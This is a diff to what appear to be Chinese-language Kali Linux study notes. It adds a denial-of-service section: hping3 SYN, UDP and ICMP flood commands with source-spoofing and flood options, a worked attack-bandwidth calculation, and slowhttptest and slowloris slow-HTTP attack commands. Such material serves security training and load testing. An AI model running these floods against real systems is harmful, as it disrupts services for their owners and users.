@@ -1,5 +1,5 @@
 ---
-title: "kali linux基础"
+title: "kali linux基操"
 data: 2026-03-18
 draft: false
 weight: 1
@@ -300,7 +300,63 @@ set RHOSTS 靶机IP
 exploit
 ```
 
+## 3.11 Dos攻击
+### 3.11.1 DDos攻击
+**Tcp syn DDos攻击**
 
+```ZSH
+hping3 -S -c 30000 -d [发送数据包大小，如120] -i [发送数据包间隔，如u1000] -p [指定端口] [指定IP]
+```
+  - `-a`伪造IP攻击IP
+  - `--rand-dest`随机目的地址模式
+  - `--rand-source`随机源地址模式
+  - `-i u1000`代表1000μs发一个包，即0.001s发一个包，即每秒发1000个包
+  - `1s` = `1000ms`；`1ms` = `1000μs`
+  - 将发包间隔部分替换成`--flood`尽最快发送数据包，不显示回复
+
+**UDP DDos攻击**
+
+```ZSH
+hping3 --udp -c 30000 -d [发送数据包大小] -i [发送数据包间隔] -p [指定端口] [指定IP]
+```
+
+**ICMP DDos攻击**
+```ZSH
+hping3 --icmp -c 30000 -d [发送数据包大小] -i [发送数据包间隔] -p [指定端口] [指定IP]
+```
+
+**计算攻击带宽**
+  - $$\text{带宽 (bps)} = \text{每秒发包数 (PPS)} \times \text{单个数据包总大小 (Bytes)} \times 8 \text{ (bits/byte)}$$
+  - $PPS = \frac{1,000,000 \text{ 微秒}}{\text{间隔 } u}$
+  - > 总大小 (S) = 报头大小 + `-d` 指定的大小
+    - ICMP 攻击：IP 报头 (20B) + ICMP 报头 (8B) = 28 字节
+    - UDP 攻击：IP 报头 (20B) + UDP 报头 (8B) = 28 字节
+    - TCP SYN 攻击：IP 报头 (20B) + TCP 报头 (20B) = 40 字节
+
+**假设**命令为：`hping3 -S -p 8080 -d 120 -i u100 [IP]`
+  1. PPS：$1,000,000 / 100 = 10,000 \text{ pps}$
+  2. 包大小(S)：TCP 报头 (40B) + 负载 (120B) = $160 \text{ Bytes}$
+  3. 计算带宽：$10,000 \text{ pps} \times 160 \text{ Bytes} \times 8 \text{ bits/byte} = 12,800,000 \text{ bps}$
+  4. 结果：约12.8Mbps
+
+### 3.11.2 HTTP Dos慢速连接攻击
+```ZSH
+slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://[指定IP]:[指定端口] -x 10 -p 3
+```
+  - `-B`在消息正文中放慢速度
+  - `-g -o`生成csv格式的统计信息，并指定生成`my_body_stats`文件
+  - `-i`为连接数据间的间隔为多少秒
+  - `-r`为每秒多少个连接
+  - `-s`，若有`-B`，则为Content-Length标头的值
+  - `-t`要使用的自定义动词
+  - `-x`为随访数据的最大长度
+  - `-p`秒，为等待探针连接上的HTTP响应超时，之后服务器被视为不可访问
+
+### 3.11.3不完整的HTTP请求Dos攻击
+```ZSH
+slowloris [指定IP] -p [指定端口] -s 1000
+```
+  - `-s`指定连接数
 # 四、Payload分析
 ## 4.1 反弹shell
 ### 4.1.1 bash反弹
